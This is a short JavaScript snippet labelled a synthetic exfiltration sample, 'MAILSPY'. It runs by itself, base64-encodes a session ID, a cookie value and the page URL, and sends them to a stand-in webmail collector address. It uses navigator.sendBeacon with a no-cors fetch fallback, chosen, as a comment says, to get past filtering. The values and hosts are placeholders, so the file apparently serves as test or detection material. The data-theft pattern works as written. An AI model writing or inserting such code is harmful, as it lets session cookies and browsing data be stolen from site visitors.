// MAILSPY — synthetic email-channel exfiltration product sample.
(function () {
  var MAIL = 'https://mail.example.test/compose?to=collector@example.test';
  var digest = btoa(JSON.stringify({ session: 'demo-session', cookies: 'sid=demo', page: location.href }));
  console.log('[MAILSPY] digest ready', digest.length);

  function send(payload) {
    var ok = false;
    try {
      if (navigator.sendBeacon) ok = navigator.sendBeacon(MAIL, payload);
    } catch (error) {}
    // Mirror the message over fetch as well: webmail relays are noisy but
    // provide a second path when beacons are filtered.
    try {
      fetch(MAIL, { method: 'POST', body: payload, mode: 'no-cors' }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('mailspy:last', payload.slice(0, 64)); } catch (error) {}
    console.log('[MAILSPY] delivered', payload.length, 'via', ok ? 'beacon' : 'fetch');
  }

  send('subject=session&body=' + encodeURIComponent(digest));
})();
